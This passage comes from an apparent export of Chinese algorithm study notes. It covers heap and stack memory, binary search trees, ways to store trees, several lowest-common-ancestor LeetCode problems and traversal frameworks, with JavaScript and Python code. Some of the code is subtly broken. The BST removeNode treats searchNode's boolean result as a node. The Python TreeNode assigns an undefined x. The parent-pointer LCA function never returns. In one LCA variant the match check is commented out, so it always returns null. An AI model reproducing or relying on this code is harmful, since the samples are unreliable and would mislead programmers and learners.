动态分配和释放内存的开销较大，因为需要查找合适的内存块，并处理碎片化问题。\n   - 常见于需要灵活管理内存的大型复杂应用中。\n- **栈内存**：\n   - 更适合小型、短生命周期的数据，具有更高的访问速度。\n   - 内存分配和释放速度快，仅通过移动栈指针即可完成。\n\n### 3.5. 总结\n\n- **堆内存**：适用于动态分配的对象，生命周期由程序员控制，管理复杂但灵活。\n- **栈内存**：适用于局部变量和函数调用，生命周期短暂且由编译器自动管理，性能高但空间有限。\n\n理解堆和栈的区别对于高效编写和调试代码至关重要，尤其是涉及到内存管理和性能优化时。\n\n## 4. 查找二叉树（二叉搜索树）\n\n- 一种特殊的二叉树，`较小`的值保存在`左节点`中，`较大`的值保存在`右节点`中\n   - `根节点的左子树`都比`根节点的值`小，`右子树的值`都比`根节点的值`大。\n   - `二叉查找树`是一种`有序的树`，所以支持`快速查找、快速插入、删除`一个数据\n\n![|576](https://832-1310531898.cos.ap-beijing.myqcloud.com/26939446c9517db965095fb586848172.png)\n\n## 5. 平衡二叉查找树\n二叉树中`任意一个节点的左右子树`的`高度相差不能大于 1`\n![|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/42e64492eba910a231f01894b3811630.png)\n![|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/2130d9f3b6d123735105cd614780218d.png)\n\n## 6. 二叉树的存储方式\n\n### 6.1. 链式存储 - 对象\n![|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/1f57396c6c7d0ec0908c8fd1d70696d0.png)\n\n### 6.2. 顺序存储 - 数组\n`完全二叉树`用`数组`来存储是最省内存的方式\n![|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/e29fe4038c62a7dc643d94fc78940983.png)\n非完全二叉树则会浪费空间，如下图：\n![|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/cf10cd1cdb8a374b53403b941b9b9e96.png)\n\n## 7. 数据结构设计 - 实现一个`二叉搜索树`\n\n### 7.1. 插入节点\n看下面一张图，在下图的树中插入健值为 `6` 的节点，过程如下：\n![|391](https://832-1310531898.cos.ap-beijing.myqcloud.com/8963bb8f3b7b3a6a1fa71319e058bde3.png)\n\n### 7.2. 移除节点\n关键看下删除有`两个子节点`的节点：\n1、【该节点与右子树中最小值位置置换】找到将右侧子树中的最小值，替换到要删除的位置\n2、 然后 递归 从 从右侧子树中移除最小节点\n如下图：\n![|495](https://832-1310531898.cos.ap-beijing.myqcloud.com/ef6da5215ad8e2ff32b2ea49faaa631f.png)\n![|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/ac3f6d93656aceb38de5dfe7f1e81277.png)\n\n### 7.3. 代码部分\n\n```javascript\n// node节点类\nclass Node {\n    constructor(key) {\n        this.key = key;\n        this.left = null;\n        this.right = null;\n    }\n    toString() {\n        return `${this.key}`;\n    }\n}\n\nexport default class BinarySearchTree {\n\n    constructor() {\n        this.root = null;\n    }\n\n    // 向树中插入一个新的键。\n    insert(key) {\n        // special case: first key\n        if (this.root == null) {\n            this.root = new Node(key);\n        } else {\n            // 从root开始遍历查找合适的位置插入\n            this.insertNode(this.root, key);\n        }\n    }\n\n    // 遍历树，将插入节点的键值与遍历到的节点键值比较，如果前者大于后者，继续递归遍历右子节点，\n    // 反之，继续遍历左子节点，直到找到一个空的节点，在该位置插入。\n    insertNode(node, key) {\n        // 如果插入节点的键值小于当前节点的键值，则需要插入左边\n        if (key < node.key) {\n            // 左节点没有值，则直接插入\n            if (node.left == null) {\n                node.left = new Node(key);\n            } else {\n                this.insertNode(node.left, key);\n            }\n            // 否则需要插入右边\n        } else {\n            if (node.right == null) {\n                node.right = new Node(key);\n            } else {\n                this.insertNode(node.right, key);\n            }\n        }\n    }\n    getRoot() {\n        return this.root;\n    }\n    inOrderTraverse(callback) {\n        this.inOrderTraverseNode(this.root, callback);\n    }\n    inOrderTraverseNode(node, callback) {\n        if (node != null) {\n            this.inOrderTraverseNode(node.left, callback);\n            callback(node.key);\n            this.inOrderTraverseNode(node.right, callback);\n        }\n    }\n\n    preOrderTraverse(callback) {\n        this.preOrderTraverseNode(this.root, callback);\n    }\n\n    preOrderTraverseNode(node, callback) {\n        if (node != null) {\n            callback(node.key);\n            this.preOrderTraverseNode(node.left, callback);\n            this.preOrderTraverseNode(node.right, callback);\n        }\n    }\n\n    postOrderTraverse(callback) {\n        this.postOrderTraverseNode(this.root, callback);\n    }\n\n    postOrderTraverseNode(node, callback) {\n        if (node != null) {\n            this.postOrderTraverseNode(node.left, callback);\n            this.postOrderTraverseNode(node.right, callback);\n            callback(node.key);\n        }\n    }\n\n    search(key) {\n        return this.searchNode(this.root, key);\n    }\n\n    // 搜索特定值的处理与插入值的处理类似。遍历树，\n    // 将要搜索的值与遍历到的节点比较，如果前者大于后者，\n    // 则递归遍历右侧子节点，反之，则递归遍历左侧子节点。\n    searchNode(node, key) {\n        if (node == null) {\n            return false;\n        }\n        // 如果要查找的值小于该节点，继续递归遍历其左侧节点\n        if (key < node.key) {\n            return this.searchNode(node.left, key);\n        }\n        // 如果要查找的值大于该节点，继续递归遍历其右侧节点\n        if (key > node.key) {\n            return this.searchNode(node.right, key);\n        }\n        return true;\n    }\n\n    min() {\n        return this.minNode(this.root);\n    }\n\n    // 在二叉搜索树里，不管是整个树还是其子树，最小值一定在树最左侧的最底层。\n    // 因此给定一颗树或其子树，只需要一直向左节点遍历到底就行了。\n    minNode(node) {\n        let current = node;\n        while (current != null && current.left != null) {\n            current = current.left;\n        }\n        return current;\n    }\n\n    max() {\n        return this.maxNode(this.root);\n    }\n\n    // 搜索最大值与搜索最小值类似，只是沿着树的右侧遍历。\n    maxNode(node) {\n        let current = node;\n        while (current != null && current.right != null) {\n            current = current.right;\n        }\n        return current;\n    }\n\n    // 移除节点，首先要在树中查找到要移除的节点，再判断该节点是否有子节点、有一个子节点或者有两个子节点，最后分别处理。\n    remove(key) {\n        // 同样从root开始遍历查找\n        this.root = this.removeNode(this.root, key);\n    }\n\n    removeNode(node, key) {\n        // 如果 node 不存在，直接返回\n        if (node == null) {\n            return null;\n        }\n        // 找到要删除的node\n        node = this.searchNode(node, key)\n\n        // 第一种情况，该节点没有子节点\n        if (node.left == null && node.right == null) {\n            node = null;\n            return node;\n        }\n        // 第二种情况，该节点只有一个子节点的节点\n        if (node.left == null) {\n            // 将右子节点替换自己\n            node = node.right;\n            return node;\n        }\n        if (node.right == null) {\n            // 将左子节点替换自己\n            node = node.left;\n            return node;\n        }\n        // 第三种情况，有有两个子节点的节点\n        // 1、找到将右侧子树中的最小值，替换到要删除的位置\n        // 2、从右侧子树中移除最小节点\n        const aux = this.minNode(node.right);\n        node.key = aux.key;\n        node.right = this.removeNode(node.right, aux.key);\n        return node;\n    }\n}\n\n```\n\n","HSCj0VVG":"\n# 一个方法秒杀 5 道最近公共祖先问题\n\n`#2024/09/07`  `#leetcode`  `#二叉树`  `#二叉树/公共祖先问题`\n\n\n## 目录\n<!-- toc -->\n ## 从二叉树中寻找一个元素 \n\n### 基本写法：完整搜索\n\n```javascript\n/**\n * @description 从二叉树中寻找一个元素\n * @param {TreeNode} root\n * @param {number} val\n */\nvar find = function (root, val) {\n  if (root == null) {\n    return null;\n  }\n  if (root.val == val) {\n    return root;\n  }\n  let left = find(root.left, val);\n  let right = find(root.right, val);\n  return left || right;\n};\n\n```\n\n### 优化： 如果已经在左子树找到了，就不需要再去右子树找了\n\n```javascript\n/**\n * 优化： 如果已经在左子树找到了，就不需要再去右子树找了\n * @description 从二叉树中寻找一个元素\n * @param {TreeNode} root\n * @param {number} val\n */\nvar find1 = function (root, val) {\n  if (root == null) {\n    return null;\n  }\n  if (root.val == val) {\n    return root;\n  }\n  let left = find1(root.left, val);\n  if (left) {\n    return left;\n  }\n  let right = find1(root.right, val);\n  if (right) {\n    return right;\n  }\n};\n```\n\n### 二叉树中寻找值为 val1 或 val2 的节点\n\n```javascript\n/**\n * @description 定义：在以 root 为根的二叉树中寻找值为 val1 或 val2 的节点\n */\n/**\n * @description 定义：在以 root 为根的二叉树中寻找值为 val1 或 val2 的节点\n */\nvar find2 = function (root, val1, val2) {\n  if (root == null) {\n    return null;\n  }\n  if (root.val == val1 || root.val == val2) {\n    return root;\n  }\n  let left = find2(root.left, val1, val2);\n  let right = find2(root.right, val1, val2);\n\n  return left || right;\n};\n```\n\n##  二叉树中两个节点的最近公共祖先\n\n### 题意要点\n\n- 这是一颗 **不含重复值**的二叉树\n- 找 **两个节点** 的最近公共祖先\n- 给点的节点**一定存在于**二叉树中\n\n### 思路\n\n只要在上文 [#二叉树中寻找值为 val1 或 val2 的节点](/post/HSCj0VVG.html#二叉树中寻找值为-val1-或-val2-的节点) 中修改**后序位置**的部分代码即可实现\n\n> https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/description/\n\n### 两种情况\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907095203.png)\n\n### 代码 \n\n```javascript\nvar lowestCommonAncestor = function (root, p, q) {\n  return find(root, p.val, q.val);\n};\nvar find = function (root, val1, val2) {\n  if (root == null) {\n    return null;\n  }\n  if (root.val == val1 || root.val == val2) {\n    return root;\n  }\n  let left = find(root.left, val1, val2);\n  let right = find(root.right, val1, val2);\n  // 后序位置：\n  // 如果左右子树都找到了，说明当前节点就是最近公共祖先\n  if (left && right) {\n    return root;\n  }\n  // 如果左子树找到了，右子树没找到，说明最近公共祖先在左子树\n  // 如果右子树找到了，左子树没找到，说明最近公共祖先在右子树\n  // 如果左右子树都没找到，说明最近公共祖先不存在\n  // 因为题设说了 p 和 q 一定存在于二叉树中，所以这里不用考虑两个都没找到的情况\n  return left || right;\n};\n```\n\n## 二叉树中多个节点的最近公共祖先\n\n### 题意要点\n\n- 这是一颗 **不含重复值**的二叉树\n- 找 **多个节点** 的最近公共祖先\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907095756.png)\n\n### 代码\n\n```javascript\nvar lowestCommonAncestor = function (root, nodes) {\n  // 将列表转化成哈希集合，便于判断元素是否存在\n  let values = new Set();\n  for (let node of nodes) {\n    values.add(node.val);\n  }\n\n  return find(root, values);\n};\n\nvar find = function (root, values) {\n  if (root == null) {\n    return null;\n  }\n  // 使用哈希集合判断当前节点存在于 values 中\n  if (values.has(root.val)) {\n    return root;\n  }\n  let left = find(root.left, values);\n  let right = find(root.right, values);\n\n  // 后序位置：\n  // 如果左右子树都找到了，说明当前节点就是最近公共祖先\n  if (left && right) {\n    return root;\n  }\n  // 如果左子树找到了，右子树没找到，说明最近公共祖先在左子树\n  // 如果右子树找到了，左子树没找到，说明最近公共祖先在右子树\n  // 如果左右子树都没找到，说明最近公共祖先不存在\n  // 因为题设说了 p 和 q 一定存在于二叉树中，所以这里不用考虑两个都没找到的情况\n  return left || right;\n};\n```\n\n## 二叉树中两个节点的最近公共祖先\n\n> 同 [#二叉树中两个节点的最近公共祖先](/post/HSCj0VVG.html#二叉树中两个节点的最近公共祖先) ，但两个节点不一定在二叉树中 \n\n### 题意要点\n\n- 这是一颗 **不含重复值**的二叉树\n- 找 **两个节点** 的最近公共祖先\n- 给点的节点**不一定存在**于二叉树中\n\n### 思路\n\n`p` 和 `q` 不一定存在于树中，所以你不能遇到一个目标值就直接返回，而应该对二叉树进行**完全搜索**（遍历每一个节点），如果发现 `p` 或 `q` 不存在于树中，那么是不存在 `LCA` 的\n\n### 代码\n\n```javascript\nfunction lowestCommonAncestor(root, p, q) {\n  return find(root, p.val, q.val);\n}\n\nfunction find(root, val1, val2) {\n  if (root == null) {\n    return null;\n  }\n\n  // 不能找到就返回 root,因为提设中说 p 和 q 不一定存在于二叉树中\n  // if (root.val == val1 || root.val == val2) {\n  //   return root;\n  // }\n\n  let left = find(root.left, val1, val2);\n  let right = find(root.right, val1, val2);\n\n  // 后序位置：\n  // 如果左右子树都找到了，说明当前节点就是最近公共祖先\n  if (left && right) {\n    return root;\n  }\n  // 如果左子树找到了，右子树没找到，说明最近公共祖先在左子树\n  if (left && !right) {\n    return left;\n  }\n  // 如果右子树找到了，左子树没找到，说明最近公共祖先在右子树\n  if (!left && right) {\n    return right;\n  }\n\n  return left || right || null;\n}\n\n```\n\n## 二叉树搜索树中两个节点的最近公共祖先\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907102039.png)\n\n### 题意要点\n\n- 这是一颗 **不含重复值**的二叉**搜索树**\n- 找 **两个节点** 的最近公共祖先\n- 给点的节点**一定存在**于二叉树中\n\n### 代码\n\n```javascript\n// 二叉树搜索树中两个节点的最近公共祖先\nvar lowestCommonAncestor = function (root, p, q) {\n  // 如果当前节点为空，说明没有最近公共祖先\n  if (root == null) {\n    return null;\n  }\n\n  // 如果 p 和 q 都小于当前节点的值，说明最近公共祖先在左子树\n  if (root.val > p.val && root.val > q.val) {\n    return lowestCommonAncestor(root.left, p, q);\n  }\n\n  // 如果 p 和 q 都大于当前节点的值，说明最近公共祖先在右子树\n  if (root.val < p.val && root.val < q.val) {\n    return lowestCommonAncestor(root.right, p, q);\n  }\n\n  // 如果 p 和 q 一个大于当前节点的值，一个小于当前节点的值，说明当前节点就是最近公共祖先\n  return root;\n};\n\n```\n\n## 二叉树的最大公共祖先变种\n\n输入的二叉树节点比较特殊，包含指向父节点的指针 `parent`\n\n```javascript\nvar Node = {\n    val: 0,\n    left: null,\n    right: null,\n    parent: null\n};\n\n// 由于节点中包含父节点的指针，所以二叉树的根节点就没必要输入了\n// 函数签名如下\nvar lowestCommonAncestor = function(p, q) {}\n\n```\n\n**这道题其实不是公共祖先的问题，而是单链表相交的问题**，你把 `parent` 指针想象成单链表的 `next` 指针，题目就变成了：\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907103749.png)\n\n如下图：\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907104537.png)\n### 代码\n\n```javascript\nvar Node = {\n  val: 0,\n  left: null,\n  right: null,\n  parent: null,\n};\n\n// 二叉树中两个节点的最近公共祖先\nvar lowestCommonAncestor = function (p, q) {\n  // 分别记录 p 和 q 的父节点，用于移动 p 和 q 到根节点\n  let p1 = p;\n  let p2 = q;\n\n  while (p1 != p2) {\n    // 如果 p1 为空，移动到 q 的父节点\n    // 如果 p1 不为空，向根节点方向移动，即指针向指向 p1 的父节点\n    if (p1 === null) {\n      p1 = q;\n    } else {\n      p1 = p1.parent;\n    }\n    // 如果 p2 为空，移动到 p 的父节点\n    // 如果 p2 不为空，向根节点方向移动，指针向指向 p2 的父节点\n    if (p2 === null) {\n      p2 = p;\n    } else {\n      p2 = p2.parent;\n    }\n  }\n};\n```\n## 参考\n\nhttps://labuladong.online/algo/practice-in-action/lowest-common-ancestor-summary/\n\n## 原题\n\n| Leetcode                                                                                                                             | 力扣                                                                                                                  |     |\n| ------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------- | --- |\n| [1644. Lowest Common Ancestor of a Binary Tree II](https://leetcode.com/problems/lowest-common-ancestor-of-a-binary-tree-ii/)🔒      | [1644. 二叉树的最近公共祖先 II](https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree-ii/)🔒                   | 🟠  |\n| [1650. Lowest Common Ancestor of a Binary Tree III](https://leetcode.com/problems/lowest-common-ancestor-of-a-binary-tree-iii/)🔒    | [1650. 二叉树的最近公共祖先 III](https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree-iii/)🔒                 | 🟠  |\n| [1676. Lowest Common Ancestor of a Binary Tree IV](https://leetcode.com/problems/lowest-common-ancestor-of-a-binary-tree-iv/)🔒      | [1676. 二叉树的最近公共祖先 IV](https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree-iv/)🔒                   | 🟠  |\n| [235. Lowest Common Ancestor of a Binary Search Tree](https://leetcode.com/problems/lowest-common-ancestor-of-a-binary-search-tree/) | [235. 二叉搜索树的最近公共祖先](https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree/)                   | 🟠  |\n| [236. Lowest Common Ancestor of a Binary Tree](https://leetcode.com/problems/lowest-common-ancestor-of-a-binary-tree/)               | [236. 二叉树的最近公共祖先](https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/)                            | 🟠  |\n| -                                                                                                                                    | [剑指 Offer 68 - I. 二叉搜索树的最近公共祖先](https://leetcode.cn/problems/er-cha-sou-suo-shu-de-zui-jin-gong-gong-zu-xian-lcof/) | 🟢  |\n| -                                                                                                                                    | [剑指 Offer 68 - II. 二叉树的最近公共祖先](https://leetcode.cn/problems/er-cha-shu-de-zui-jin-gong-gong-zu-xian-lcof/)          |     |\n","IGoaBy3B":"\n# 二叉树基本概念：Python 描述\n\n`#二叉树`  `#数据结构` \n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\n```python\n# 二叉树的节点定义\nclass TreeNode:\n    def __init__(self, val: int):\n        self.val = x\n        self.left = None\n        self.right = None\n\n# 你可以这样构建一棵二叉树：\nroot = TreeNode(1)\nroot.left = TreeNode(2)\nroot.right = TreeNode(3)\nroot.left.left = TreeNode(4)\nroot.right.left = TreeNode(5)\nroot.right.right = TreeNode(6)\n\n# 构建出来的二叉树是这样的：\n#     1\n#    / \\\n#   2   3\n#  /   / \\\n# 4   5   6\n```\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922163210.png)\n## 2. 常见术语\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922163226.png)\n\n## 3. 完美二叉树：满二叉树\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922163758.png)\n\n## 4. 完全二叉树：只有最底层没被填满\n\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922163825.png)\n\n这里着重说下`完全二叉树`：\n- 叶子节点都在 `最底下两层`\n- 最后一层叶子节都靠`左排列`\n- 并且`除了最后一层`，其他层的节点个数都要达到最大\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/9a9462b0ae355f83607ec904d5df7553.png)\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/05dd6048d8688e6a58ef6e8518485942.png)\n\n\n## 5. 完满二叉树\n\n完满二叉树（full binary tree）除了叶节点之外，其余所有节点都有两个子节点。\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922164014.png)\n\n## 6. 平衡二叉树\n\n平衡二叉树（balanced binary tree）中任意节点的左子树和右子树的高度之差的绝对值不超过 1\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922164058.png)\n\n\n二叉树中`任意一个节点的左右子树`的`高度相差不能大于 1`\n\n![|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/42e64492eba910a231f01894b3811630.png)\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/2130d9f3b6d123735105cd614780218d.png)\n\n## 7. 二叉树的退化 → 单链表\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922164118.png)\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922164214.png)\n\n\n\n\n","b6SGjWeW":"\n# 二叉搜索树（篇一：二叉树的特性）\n\n\n`#BST` `#leetcode`  `#二叉树/二叉搜索树`   `#2024/09/08`\n\n\n## 目录\n<!-- toc -->\n ## 1. 二叉搜索树的特性 \n\n- 左小右大\n\t- 因为这个特性，它可以提供 `logN` 级别的增删查改效率\n\t- 直接基于 BST 的数据结构有 AVL 树，红黑树等\n- 它的每个子节点的左侧子树和右侧子树**都是 BST**\n- BST 的**中序**遍历结果是**升序**的\n\n## 2. 二叉搜索树中第K小的元素\n\n### 2.1. 题意\n\n![cos-blog-832-34-20241012|552](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908112644.png)\n\n### 2.2. 代码实现\n\n```javascript\nvar kthSmallest = function (root, k) {\n  let res = 0;\n  function traverse(node) {\n    if (!node) return;\n\n    traverse(node.left);\n    /*********************************\n     ********** 中序位置 **************\n     **********************************/\n    k--;\n    // k === 0 时，表示已经找到第 k 小的元素\n    if (k === 0) {\n      res = node.val;\n      return;\n    }\n    traverse(node.right);\n  }\n\n  traverse(root);\n\n  return res;\n};\n```\n\n### 2.3. 复杂度分析\n\n时间复杂度：\n1. 最佳情况：`O(k)`\n   - 如果第 k 小的元素在树的左侧较浅的位置，我们可能只需要访问 k 个节点就能找到它。\n2. 最坏情况：`O(n)`\n   - 如果 k 等于节点总数，或者第 k 小的元素在树的右侧较深的位置，我们可能需要遍历整棵树。\n   - n 是树中节点的总数。\n3. 平均情况：`O(n)`\n   - 在平均情况下，我们可能需要遍历大部分节点才能找到第 k 小的元素。\n\n空间复杂度：`O(h)`，其中 h 是**树的高度**\n1. 主要的空间消耗来自于递归调用栈。\n2. 在最坏情况下（树完全不平衡，呈现为一条链），高度 h 可能等于节点数 n，此时空间复杂度为 O(n)。\n3. 在最佳情况下（完全平衡二叉树），高度 h 约等于 log(n)，此时空间复杂度为 `O(log n)`。\n\n额外说明：\n- 这个解法没有使用任何额外的数据结构来存储节点，这有助于保持较低的空间复杂度。\n- 虽然我们定义了几个变量（count, result），但它们占用的空间是常数级的，不随输入规模变化，因此在分析空间复杂度时可以忽略不计。\n\n总结：\n- 时间复杂度：\n\t- 最佳 `O(k)`\n\t- 最坏和平均 `O(n)`\n- 空间复杂度：`O(h)`，其中 h 是树的高度，最坏情况下可能达到 `O(n)`\n\n这个解法在时间和空间效率上都是相当不错的，特别是对于平衡的二叉搜索树，它的性能表现会更好。\n\n### 2.4. 优化：中序遍历 + 数组缓存\n\n这种方法适用于树不经常变动，但频繁查询不同 k 值的情况\n\n## 3. 把二叉搜索树转换为累加树\n\n### 3.1. 题目\n\n![cos-blog-832-34-20241012|592](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908115150.png)\n\n```javascript\n/**\n * @description 二叉搜索树转累加树\n * @param {TreeNode} root\n * @return {TreeNode}\n */\nvar convertBST = function (root) {\n  var sum = 0;\n\n  var traverse = function (root) {\n    if (root == null) {\n      return;\n    }\n    // 需要反序中序遍历\n    // 先进入右子树，再访问根节点，最后左子树\n    // 所以中序遍历的逆序是：右 -> 根 -> 左\n    // 计算累加和时，需要先遍历右子树，再累加根节点的值，最后遍历左子树\n    traverse(root.right);\n    /*****************\n     * 中序遍历位置\n     ****************/\n    // 维护累加和\n    sum += root.val;\n    // 将 BST 转化成累加树\n    root.val = sum;\n    traverse(root.left);\n  };\n\n  traverse(root);\n\n  // 返回根节点\n  return root;\n};\n```\n\n### 3.2. 注意点\n\n- 需要先遍历**右节点**   ， 这样在中序位置的代码就是 **右 → 根节点** →  左\n\t- `sum = 所有右节点 + 根节点的值`\n\n## 4. 参考\n\nhttps://labuladong.online/algo/data-structure/bst-part1/\n\n## 5. 相关题目\n\n| LeetCode                                                                                                              | 力扣                                                                                        | 难度  |\n| --------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- | --- |\n| [1038. Binary Search Tree to Greater Sum Tree](https://leetcode.com/problems/binary-search-tree-to-greater-sum-tree/) | [1038. 从二叉搜索树到更大和树](https://leetcode.cn/problems/binary-search-tree-to-greater-sum-tree/) | 🟠  |\n| [230. Kth Smallest Element in a BST](https://leetcode.com/problems/kth-smallest-element-in-a-bst/)                    | [230. 二叉搜索树中第K小的元素](https://leetcode.cn/problems/kth-smallest-element-in-a-bst/)          | 🟠  |\n| [538. Convert BST to Greater Tree](https://leetcode.com/problems/convert-bst-to-greater-tree/)                        | [538. 把二叉搜索树转换为累加树](https://leetcode.cn/problems/convert-bst-to-greater-tree/)            | 🟠  |\n| -                                                                                                                     | [剑指 Offer II 054. 所有大于等于节点的值之和](https://leetcode.cn/problems/w6cpku/)                     | 🟠  |\n\n","1JgsN1JC":"\n# 二叉树的存储方式\n\n\n`#二叉树`  `#数据结构` \n\n\n两种存储方式\n- 链式存储\n- 数组存储\n\n\n## 目录\n<!-- toc -->\n ## 1. 链式存储 - 对象 \n\n![|512](https://832-1310531898.cos.ap-beijing.myqcloud.com/1f57396c6c7d0ec0908c8fd1d70696d0.png)\n\n## 2. 顺序存储 - 数组\n\n### 2.1. 完美二叉树的数组表示\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922165414.png)\n\n### 2.2. 数组可唯一的表示二叉树\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922165450.png)\n\n### 2.3. 完全二叉树：数组没有空位\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922165531.png)\n### 2.4. 是否省内存\n\n`完全二叉树`用`数组`来存储是最省内存的方式\n\n![|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/e29fe4038c62a7dc643d94fc78940983.png)\n\n非完全二叉树则会浪费空间，如下图：\n\n![|576](https://832-1310531898.cos.ap-beijing.myqcloud.com/cf10cd1cdb8a374b53403b941b9b9e96.png)\n\n### 2.5. 优劣势分析\n\n二叉树的数组表示主要有以下优点\n- 数组存储在连续的内存空间中，对缓存友好，访问与遍历速度较快。\n- 不需要存储指针，比较节省空间。\n- 允许随机访问节点。\n然而，数组表示也存在一些局限性\n- 数组存储需要连续内存空间，因此不适合存储数据量过大的树。\n- 增删节点需要通过数组插入与删除操作实现，效率较低。\n- 当二叉树中存在大量 `None` 时，数组中包含的节点数据比重较低，空间利用率较低\n","u50IBkvQ":"\n# 二叉树算法概述\n\n\n`#算法/二叉树` `#2023/04/22`\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 二叉树的**重要性**：只要涉及到`递归`，就是二叉树问题\n- 理解二叉树的前后中序遍历\n- 二叉树的两种解法\n- 示例：二叉树的`最大深度`\n- 示例：求解二叉树的`直径` \n- 层次遍历：其实就是 BFS \n\n## 2. 二叉树的重要性\n\n`二叉树模型`几乎是所有高级算法的基础，换句话来说，`递归`有多重要，那么二叉树就有多重要 \n\n> [!info]\n> 自己想想 `递归` 有多重要\n\n**甚至可以说，只要涉及 `递归`，都可以抽象成`二叉树`的问题。**\n\n## 3. 真正理解二叉树的`前后中遍历`\n\n### 3.1. 教科书中的二叉树遍历\n\n- 前序遍历（`根 => 左 => 右`）\n\t- 对于树中的`任意节点`来说，先访问这个`节点本身`，然后再访问它的`左子树`，最后访问它的`右子树`\n\t- **场景：** 输出某个文件夹下所有文件名称(可以有子文件夹) \n- 中序遍历（`左 => 根 => 右`）\n\t- 对于树中的`任意节点来`说，先访问它的`左子树`，然后再访问`它的本身`，最后访问它的`右子树`\n\t- **应用：**  比如对 二叉搜索树进行排序\n- 后序遍历（`左 => 右 => 根`）\n\t- 对于树中的`任意节点`来说，先访问它的`左子树`，然后再访问它的`右子树`，最后访问`它本身`\n\t- **应用：** 需要根据 `左右子树的信息` 去执行操作，比如删除节点，又比如`统计某个文件夹的大小` ，你就得知道它下面所有文件或者文件夹的大小。\n\n比如`前后遍历`的代码如下：\n\n![image.png|525](https://832-1310531898.cos.ap-beijing.myqcloud.com/86f2e58a772430f68b6f6b94b4c2da40.png)\n\n#### 3.1.1. 二叉树遍历框架：关注三个位置即可\n\n```javascript\nfunction traverse(root) {\n    if (root == null) {\n        return;\n    }\n    /*************************************************\n     * ::::前序位置::::\n     ************************************************/\n    traverse(root.left);\n    /*************************************************\n     * ::::中序位置::::\n     ************************************************/\n    traverse(root.right);\n    /*************************************************\n     * ::::后序位置::::\n     ************************************************/\n}\n```\n\n那么，你真正理解了前后中遍历了吗？比如，`快速排序`就是个`二叉树的前序遍历`，`归并排序`就是个`二叉树的后序遍历` ，你`如何理解`？\n\n### 3.2. `快速排序`就是二叉树的`前序遍历`\n\n代码框架：\n\n```javascript\nvar sort = function (nums, lo, hi) {\n    /*************************************************\n     * ::::前序位置::::\n     ************************************************/\n    // 通过交换元素构建分界点 p\n    var p = partition(nums, lo, hi);\n\n    sort(nums, lo, p - 1);\n    sort(nums, p + 1, hi);\n};\n```\n\n### 3.3. `归并排序` 就是二叉树的`后序遍历`\n\n代码框架：\n\n```javascript\n// 定义：排序 nums[lo..hi]\nfunction sort(nums, lo, hi) {\n  if (lo == hi) {\n    return;\n  }\n  \n  var mid = Math.floor((lo + hi) / 2);\n  // 递归1:  利用定义，排序 nums[lo..mid]\n  sort(nums, lo, mid);\n  // 递归2:  利用定义，排序 nums[mid+1..hi]\n  sort(nums, mid + 1, hi);\n\n  /****** 后序位置 ******/\n  // 合并两个有序数组，\n  merge(nums, lo, mid, hi);\n\n}\nfunction merge(nums, lo, mid, hi);\n```\n\n### 3.4. 说回遍历框架：前中序究竟代表什么？\n\n```javascript\nvar traverse = function(root) {\n    if (root === null) {\n        return;\n    }\n    // 前序位置\n    traverse(root.left);\n    // 中序位置\n    traverse(root.right);\n    // 后序位置\n}\n```\n\n以上遍历框架，只是一个能够`遍历二叉树所有节点`的一个`函数 traverse` 而已，和 遍历`数组`、`链表`没有任何区别。如下：\n\n```javascript\n\n// 迭代遍历：for循环 遍历数组\nvar traverse = function(arr){\n    for (var i=0; i<arr.length; i++) {\n        // Code block to be executed\n    }\n}\n// 递归遍历： 遍历数组\nvar 